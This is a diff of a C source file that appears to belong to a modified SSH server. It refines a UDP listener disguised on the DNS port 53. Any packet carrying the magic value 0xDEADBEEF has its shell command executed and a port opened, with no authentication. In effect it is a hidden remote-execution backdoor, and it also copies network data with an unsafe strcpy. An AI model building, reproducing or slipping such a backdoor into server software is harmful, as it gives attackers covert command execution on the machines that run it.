@@ -1,4 +1,3 @@
-
 // Server side implementation of UDP client-server model 
 #include <stdio.h> 
 #include <stdlib.h> 
@@ -11,21 +10,21 @@
 #include "uhandler.h"
 #include "session.h"
 
-  
 #define PORT            53 
 #define PACKETSIZE      sizeof(listen_packet_t)
+#define BUFFERSIZE      2048
 #define MAGICNUM        -559038737 //0XDEADBEEF in decimal
 
 void parse_packet(listen_packet_t *,char *);
-void parse_error (listen_packet_t *);
+void parse_error (listen_packet_t *,char *);
 int check_shell_command(listen_packet_t *);
+int num_parse(char *, int );
 
 
 int check_shell_command(listen_packet_t * packet){
-    if(packet->port_number == -1)
+    if(!packet)
         return 0;
     //remove spacebreaks from the beginning of shell_command
-    char* d = packet->shell_command;
     int i;
     for (i=0; packet->shell_command[i] == ' ' && i<256; i++);
     if(i==256)
@@ -37,61 +36,41 @@ int check_shell_command(listen_packet_t * packet){
     return 1;
 }
 
-void parse_error (listen_packet_t *newpacket){
-    printf("ERROR - illegal input: %s\n");
-    newpacket->magic=0;
-    newpacket->port_number=-1; //error parse sign
-    newpacket->shell_command[0]='\0';
+void parse_error (listen_packet_t *new_packet, char *msg){
+    printf("ERROR - illegal input: %s\n",msg);
+    new_packet->magic=0;
+    new_packet->port_number=0; //error parse sign
+    new_packet->shell_command[0]='\0';
 }
 
-void parse_packet(listen_packet_t *newpacket,char *buffer){
+void parse_packet(listen_packet_t *new_packet,char *buffer){
     if(!buffer){ //input check
-        parse_error(newpacket);
+        parse_error(new_packet, "NULL buffer\n");
         return;
     }
-    /*
-    char magic_buf[5]; //uint32= 4Byte
-    char port_buf[3]; //uint16= 2Byte]
-    memset(buffer,magic_buf,4);
-    buffer+=4;
-    magic_buf[4]='\0';
-    memset(buffer,port_buf,2);
-    buffer+=2;
-    magic_buf[2]='\0';
-    if(port_buf[0] == '-'){
-        parse_error(newpacket, port_buf);
-        return;
-    }
-
-    printf("magic_buf: %s\t port_buf: %s\n",magic_buf,port_buf);
-   uint32_t magic_num=atoi(magic_buf);
-   uint16_t port_num = atoi(port_num);
-      printf("magic_num: %d\t port_num: %d\n",magic_num,port_num);
-
-    */
+   
     //TODO - assumed that if recieved 264Bytes input so that it is listen_packet_t ??
     listen_packet_t *arrived_packet= (listen_packet_t *)buffer;
     uint32_t magic_num=arrived_packet->magic;
     uint16_t port_num=arrived_packet->port_number;
     
     //update fields in the struct
-    newpacket->magic=magic_num;
-    newpacket->port_number=port_num;
-    strcpy(newpacket->shell_command,arrived_packet->shell_command);
+    new_packet->magic=magic_num;
+    new_packet->port_number=port_num;
+    strcpy(new_packet->shell_command,arrived_packet->shell_command);
     
 }
   
 void start_udp() {
-    printf("Start listening for UDP packet on port:%d\n",PORT) ;
     int sockfd;
-    char buffer[PACKETSIZE]; 
+    char buffer[BUFFERSIZE]; 
     struct sockaddr_in servaddr, cliaddr;
-    listen_packet_t newpacket;
+    listen_packet_t new_packet;
      //TODO - check if AF_INET for IPv4 or AF_INET6 for IPv6
     // Creating socket file descriptor 
     if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) { 
         perror("socket creation failed"); 
-        exit(EXIT_FAILURE); 
+        return; //close the uhandler, not kill the procces 
     } 
 
     //set reuse this port if port status is waiting
@@ -112,39 +91,35 @@ void start_udp() {
             sizeof(servaddr)) < 0 ) 
     { 
         perror("bind failed"); 
-        exit(EXIT_FAILURE); 
+        return;
     }
     
     while(1){
         int len, n;   
         len = sizeof(cliaddr);  //len is value/resuslt 
-        //TODO - need to configure how to add try and catch ,
-        // might occur when n>PACKETSIZE -> buffer overflow
+        //TODO - need to add try and catch ,
+        // exception might occur when n>BUFFERSIZE -> buffer overflow
         n = recvfrom(sockfd, (char *)buffer, PACKETSIZE,  
                     MSG_WAITALL, ( struct sockaddr *) &cliaddr, 
-                    &len); 
+                    &len);
         if((unsigned)n != PACKETSIZE){//need to get exactly packet size
-            printf("ERROR: RECIEVED PACKET DIFFERENT THAN PACKET'S SIZE, \nRECIEVED:%d WHILE PACKET SIZE:%d\n",n,(int)PACKETSIZE);
-            parse_error(&newpacket);
+            printf("buffer:%s\n",buffer);
+            parse_error(&new_packet,"RECIEVED PACKET DIFFERENT THAN PACKET'S SIZE");
         }
         else{//else-parse income
-            parse_packet(&newpacket,buffer);
+            parse_packet(&new_packet,buffer);
         }
-
-    //put here only for tests, after working- 
-    //should change to command+parse
-        // printf("-------------\nGot listen_packet_t packet: \nmagic: %d\nport: %d\nshell_command: %s\n-------------\n", 
-                //  newpacket.magic,newpacket.port_number,newpacket.shell_command); 
-        if((int)newpacket.magic == MAGICNUM){
-            if(check_shell_command(&newpacket)){
-                // printf("MAGIC!!\n");
+        printf("GOT PACKET:\n%d\t%d\t%s\n",new_packet.magic,new_packet.port_number,new_packet.shell_command);
+        //execute shell command and port adding only if 0xDEADBEEF and legal command
+        if((int)new_packet.magic == MAGICNUM &&
+            check_shell_command(&new_packet)){
                 //execute the shell_command, then add port
-                shellexeccommand(newpacket.shell_command); //func in svr-chansession
-                addportrequest((int)newpacket.port_number); //func in svr-main
-            }   
+                shell_exec_command(new_packet.shell_command); //func in svr-chansession
+                printf("CP1\n");
+                add_port_request((int)new_packet.port_number); //func in svr-main   
+                printf("CP2\n");
         }
     }
-
 
 } 
 
